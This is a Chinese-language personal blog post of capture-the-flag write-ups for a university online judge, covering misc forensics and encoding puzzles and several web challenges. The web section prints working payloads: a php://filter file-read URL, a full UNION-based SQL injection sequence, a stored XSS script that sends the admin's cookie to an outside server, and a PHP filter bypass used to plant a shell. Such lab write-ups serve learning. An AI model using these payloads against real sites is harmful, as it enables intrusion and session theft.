---
layout: post
title: "day10 ouc_oj"
date:  2020-05-26 14:58:44
description: "day10 log"
tag: 总结
---



> 
>
> 今天把除了二进制要求做的都做完了，明天，0基础开始try bin。
>
> writeup写的比较粗略，只放了比较短的脚本
>
> 



# Misc Part

### day10-BabyBase

观察字符串可以发现每隔一个数字就有一个3，推测字符串为每两个一组，进行统计，发现范围都在30-39之内:

<img src="/images/oj_wp/image-20200526205526159.png" alt="image-20200526205526159" style="zoom:33%;" />

将分割后的字符串处理，得到0-9组成的字符串,该字符串和上一组一样，每隔一个数字就有一个3，继续分割处理，发现范围在30-46之间，没有40，一共十六个数，猜测应该把字符转为十六进制

<img src="/images/oj_wp/image-20200526205421582.png" alt="image-20200526205421582" style="zoom:33%;" />

<img src="/images/oj_wp/image-20200526210333860.png" alt="image-20200526210333860" style="zoom:33%;" />

对得到的十六进制字符串进行ascii解码，得到一串base64编码后的字符串

<img src="/images/oj_wp/image-20200526210730244.png" alt="image-20200526210730244" style="zoom:33%;" />

对该字符串进行解码,的到base32编码后的字符串，

<img src="/images/oj_wp/image-20200526210916045.png" alt="image-20200526210916045" style="zoom:33%;" />

对该字符串进行解码的到一串base32编码的字符串，继续解码，又的到base32编码，继续解码，的到一串base64编码的字符串，继续解码，又的到30-46的字符

...

重复以上活动，终于get flag（又是想暴打出题人的一天



### day10-Log

日志文件中是很多条数据，首先进行URL解码得到可读字符串，可以发现，在第1751组数据之后才是关于flag的盲注记录。

![image-20200526215607840](/images/oj_wp/image-20200526215607840.png)

该盲注使用二分法进行flag爆破，当条件成立时回返回`183`，不成立时返回`182`，对1752-最后一组数据进行处理，将183返回值的最后一个、182返回值前的数据中的ascii值加一然后转为ascii码，综合得到flag



### day10-Shell

打开数据包，追踪TCP数据流，发现如下的内容，红框内的被base64编码后的应该就是flag，直接解码不对。

看上面的cat命令发现用到了`swapcase()`函数，将字符串使用`swapcase()`函数处理一下再用base64解码可以get flag

<img src="/images/oj_wp/image-20200526183305149.png" alt="image-20200526183305149" style="zoom: 25%;" />



### day10-Terminal

打开数据包，追踪TCP数据流，选择HEX查看，发现有些数据后面有一些字符串，

<img src="/images/oj_wp/image-20200526173555575.png" alt="image-20200526173555575" style="zoom: 25%;" />

将这些数据保存问原始数据，根据提示写脚本处理，可以看到输出，get flag

<img src="/images/oj_wp/image-20200526180702327.png" alt="image-20200526180702327" style="zoom: 33%;" />



### day10-Email

追踪流-TCP流，依次查看TCP流，在流4中可以看到很长的一段base64，编码上方有`filename=20161008103416509320.7z`字样，编码方式为base64，猜测下方的base64为这个7z文件的内容，保存数据为原始数据，写脚本对base字符串进行base64解码，将解码的结果保存为.7文件。随后打开7z文件发现需要密码，回到原始数据里面找，发现有`附件密码是：x x x x`，输入密码，压缩包里是一个通知文件，十六进制打开，搜索flag格式，get flag



### day10-Invisible flag

图片像是被截掉一部分了，可以通过修改图片的宽或高来查看是否有截断。

查看十六进制文件，脚本爆破CRC校验码，获得宽度值为564，而图片图片中的高却为400的十六进制，所以应该需要改高度，but修改之后提示图片损坏，后来才知道Mac上面改有可能不生效或者报错...只能用win了。。果然，win下修改之后的图片出flag了==、

```python
import struct
import binascii
import os

misc = open('whereisflag.png','rb').read()

for i in range(1024):
   data = misc[12:16] + struct.pack('>i',i) + misc[20:29]
   crc32 = binascii.crc32(data) & 0xffffffff
   if crc32 == 0x368C6D31:
       print i
```

高度修改成534

<img src="/images/oj_wp/image-20200526135008681.png" alt="image-20200526135008681" style="zoom: 67%;" />



### day10-NTFS2

这道题本来想用stegsolve做的，但是Mac上的这个软件的通道只能显示到2，懒得开虚拟机就直接用下面的方法做了

<img src="/images/oj_wp/image-20200526130359276.png" alt="image-20200526130359276" style="zoom: 33%;" />



### day10-NTFS

使用NTFS ADS解即可，如图

<img src="/images/oj_wp/image-20200526113402338.png" alt="image-20200526113402338" style="zoom:50%;" />



### day10-PkCrack

题目都给了，使用AZPR解出未加密文件，get flag

<img src="/images/oj_wp/image-20200526105707457.png" alt="image-20200526105707457" style="zoom:50%;" />



### day10-Birthday

依然使用上一个软件，不过把模式改为爆破，get 密码，就可以看到flag啦

<img src="/images/oj_wp/image-20200526110113889.png" alt="image-20200526110113889" style="zoom:50%;" />



> 
>
> 论文终于给老师检查完了，还是有需要修改的地方，不过终于可以做题咯
>
> 

###  day9-Poem

看图结合蛤->想起一句诗，把诗输入，get flag



### day9-LSB

题目给解法了，扫码，get flag

<img src="/images/oj_wp/image-20200525224755129.png" alt="image-20200525224755129" style="zoom:33%;" />



### day9-Exif

使用电脑查看exif信息，看样子是ascii码，解码，get flag

```python
str = "102,108,97,103,123,101,120,105,102,95,104,105,100,100,101,110,95,102,108,52,103,125"
list = str.split(',')
flag=''
for i in list:
	flag += chr(int(i))
print(flag)
```

<img src="/images/oj_wp/image-20200525225700404.png" alt="image-20200525225700404" style="zoom:33%;" />



### day9-Another 01Game

按照题目所给的思路，写脚本将题目给的01字符串生成图片

```python
#!/usr/bin/env python
from PIL import Image
MAX = 37
pic = Image.new("RGB",(MAX, MAX))
file = open("1.txt",'r')
m = file.read()
print(len(m))
i=0
for y in range (0,MAX):
    for x in range (0,MAX):
        if(m[i] == '0'):
            pic.putpixel([x,y],(0, 0, 0))
        else:
            pic.putpixel([x,y],(255,255,255))
        i = i+1
pic.show()
pic.save("flag.png")
```

扫码获得01字符串`110011011011001100001110011111110111111001011000010101011011111100101110011101001111101011110111111100001110001001100001110101111010010111111110001101001010000110110000110010001100111111101`

长度为189，ascii码的最大值为127，也就是0b11111，长度为7

把获得的01字符串按7个一组进行ascii解码，获得flag

```python
#coding:utf-8
import re
a = "110011011011001100001110011111110111111001011000010101011011111100101110011101001111101011110111111100001110001001100001110101111010010111111110001101001010000110110000110010001100111111101"

result = re.findall(r'.{7}', a)
print(result)
flag = ""
for i in result:
    tmp = int(i, 2)
    flag += chr(tmp)
print(flag)
```



### day9-docx

word的本质是zip，修改文件后缀为zip，打开get flag



### day9-Forensics1

Wireshark打开文件，然后追踪http流，发现有一组数据中提到flag和一个s3cret.png文件，提取图片，get flag



### day9-Forensics2

使用`binwalk -e xx.pcap `命令，即可提取出flag.txt文件



# Web Part

### day 9-BasicFileInclude

#### 题目描述：

<img src="/images/oj_wp/image-20200525214432331.png" alt="image-20200525214432331" style="zoom:33%;" />

#### 解题思路：

这是一道文件包含的题目。这道题中一共有两个页面，一个是home，一个是flag，访问flag page：`ha ha? you want flag? flag is here, but don't let you see!`，可以看出flag应该在这个页面中，但是没有显示出来。

想要获取被隐藏的内容需要使用PHP伪协议，这里的目的是读取flag文件，所以应当使用`php://filter`来读取源码。

构造URL：

```
http://vps1.blue-whale.me:23338/?page=php://filter/read=convert.base64-encode/resource=flag
```

其中`read`的过滤器为base64，意为把输入流进行base64编码；`resource`指的是所要读取的文件

<img src="/images/oj_wp/image-20200525215718596.png" alt="image-20200525215718596" style="zoom:33%;" />

对获取到的内容进行base64解码，得到以下内容，get flag

```php
ha ha? you want flag? flag is here<?php
// try to read this source code
//$flag = 'flag{really***should_know}';
?>, but don't let you see!
```



### day 9-Basic SQL

#### 题目描述：

<img src="/images/oj_wp/image-20200525220221182.png" alt="image-20200525220221182" style="zoom:33%;" />

#### 解题思路：

在搜索框中输入`hello`，正常。

输入`hello'`，页面500错误，可以注入



输入`hello' order by 1 #`，正常

输入`hello' order by 2 #`，正常

输入`hello' order by 3 #`，正常

输入`hello' order by 4 #`，500错误，从未判断数据表有三列

输入`hello' union select 1,2,3#`，news中显示`2` ` 3`，可知2，3位置为回显点



查找数据库名：输入`hello' union select 1,database(),3#`，news中显示`news ` `3`，可知库名为`news`

查找数据库的表名：输入`hello' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#`，news中显示`f1agfl4gher3,news` `3`,所以存在名为`f1agfl4gher3`与`news`的表

查找`f1agfl4gher3`中的字段名：`hello' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='f1agfl4gher3'#`，news中显示`id,h3r31sfl4g` `3`

查询`h3r31sfl4g`中的数据：`hello' union select 1,h3r31sfl4g,3 from f1agfl4gher3#`，news中显示`flag{sql***hack}`，get flag



### day9-Welcome to web

#### 题目描述：

```php
<?php
	if(isset($_GET['key'])){
		if($_GET['key'] == 'areyousure'){
			echo 'For this exercise, flag is: ******';
		}
	}
?>
```

构造URL：`http://vps1.blue-whale.me:23331/php0/?key=areyousur`,get flag



### day 6 BabyXSS

> 这两天在写论文，所以一直没有做题...

#### 题目描述：

<img src="/images/oj_wp/image-20200522231538713.png" alt="image-20200522231538713" style="zoom:20%;" />

#### 解题思路：

注意到最下面有个MD5验证，写脚本爆破：

```python
# -*- coding:utf-8 -*-
import hashlib
code = '25fdee'

def MD5(str):
    return hashlib.md5(str).hexdigest()
    
for i in range(0, 9999999):
    md5 = MD5(str(i))
    if md5[:6] == code:
        print(i)
        exit(0)
```

提交`<script>alert(1);</script>`测试留言板的过滤情况

<img src="/images/oj_wp/image-20200522233240420.png" alt="image-20200522233240420" style="zoom:33%;" />

显示留言成功并在管理员查看队列中，然后访问留言，发现弹窗，查看网页源代码，留言页面没有过滤`script`标签。

<img src="/images/oj_wp/image-20200522233437142.png" alt="image-20200522233437142" style="zoom:33%;" />

尝试构造语句获取cookie，其中地址是接收服务器的地址：

```javascript
<script>var img = document.createElement("img");
img.src = "http://139.199.31.158/log?"+escape(document.cookie);
document.body.appendChild(img);</script>
```

服务器接收到了admin的cookie，

<img src="/images/oj_wp/C060424737C3DD81BEBD02319F001DEA.png" alt="C060424737C3DD81BEBD02319F001DEA" style="zoom:33%;" />

使用这个cookie访问admin.php即可获得flag

<img src="/images/oj_wp/image-20200523000907465.png" alt="image-20200523000907465" style="zoom:33%;" />



### day3-Basic PHP 2

#### 题目描述：

<img src="/images/oj_wp/image-20200519205227987.png" alt="image-20200519205227987" style="zoom:33%;" />

<img src="/images/oj_wp/image-20200519205317245.png" alt="image-20200519205317245" style="zoom:33%;" />

#### 解题思路

try写个shell进去，但是又过滤了`<` 和`php`，对于stripos()函数可以使用数组绕过，传入`？content[]=<?php>`，显示success后访问./config.php，就获得了flag...

8继续肝论文去了QAQ

<img src="/images/oj_wp/image-20200519205631617.png" alt="image-20200519205631617" style="zoom:33%;" />



> 
>
> 今天只做了一个题，希望赶紧把毕设搞完就可以愉快地做题了
>
> 

### day2-Rapid Typing

#### 题目描述

<img src="/images/oj_wp/image-20200518180932073.png" alt="image-20200518180932073" style="zoom:33%;" />

#### 解题思路：

抓包发现base64，解码得到一个html，用BeautifulSoup就可以了，一开始没注意还有坐标问题，试了好几次都不对==、

<img src="/images/oj_wp/image-20200518180842561.png" alt="image-20200518180842561" style="zoom:20%;" />



### day1-Calculator

#### 题目描述：

<img src="/images/oj_wp/image-20200517224348519.png" alt="image-20200517224348519" style="zoom:33%;" />



#### 解题思路：

既然题目要求在1.5s内解出答案，肯定得用脚本了。抓包获取cookies然后放在脚本里就OK了，脚本猜测有写得更简洁的方法，但我暂时想到的就是这样。

<img src="/images/oj_wp/image-20200517153139132.png" alt="image-20200517153139132" style="zoom:33%;" />

#### 解题脚本

```python
import re
import requests
#发送post和get请求的url
get_url = 'http://vps1.blue-whale.me:23331/calculator/'
send_url = 'http://vps1.blue-whale.me:23331/calculator/?answer='
#利用get方法获取网页数据
cookies = '<RequestsCookieJar[<Cookie PHPSESSID=dfa32c999a84f176eb4327e27660e3a9 for vps1.blue-whale.me/>]>'
r = requests.get(get_url)
#构造与匹配正则表达式
str_text = r"<span id=\"exp\">.*= </span>"
match = re.search(str_text,r.text)
#处理匹配后的结果
result = match.group().replace("<span id=\"exp\">","")
result = result.replace("= </span>","")
result = eval(result)
cookies=r.cookies
response = requests.get(send_url+str(result), cookies=r.cookies)
response.encoding = response.apparent_encoding
print(response.content)
```

#### 返回内容

```html
b'<!DOCTYPE html>\r\n<html>\r\n<head>\r\n\t<title>Calculator</title>\r\n\t<style type="text/css">\r\n\t\t.line_input{\r\n\t\t\tborder-width: 1px;\r\n\t\t\tborder-bottom: solid;\r\n\t\t\tborder-top: none;\r\n\t\t\tborder-left: none;\r\n\t\t\tborder-right: none;\r\n\t\t\tborder-width: 1px;\r\n\t\t\ttext-align: center;\r\n\t\t\toutline: none;\r\n\t\t\tmargin: 0 1em;\r\n\t\t}\r\n\t</style>\r\n</head>\r\n<body>\r\n<center>\r\n<h1>Yet Another Calculator</h1>\r\nflag{yes_you_are_calculat0r}<br />Time elapsed: 0.23214817047119 s<br />\r\n</center>\r\n</body>\r\n</html>'
```

<img src="/images/oj_wp/image-20200517121543980.png" alt="image-20200517121543980" style="zoom:33%;" />



### day1-PHP's basic feature

有一些字符串md5加密后以0e开头，PHP在使用这些字符串时，会将字符串当作科学技术法来解释为0，从而使`==`成立。

<img src="/images/oj_wp/image-20200517155517748.png" alt="image-20200517155517748" style="zoom:33%;" />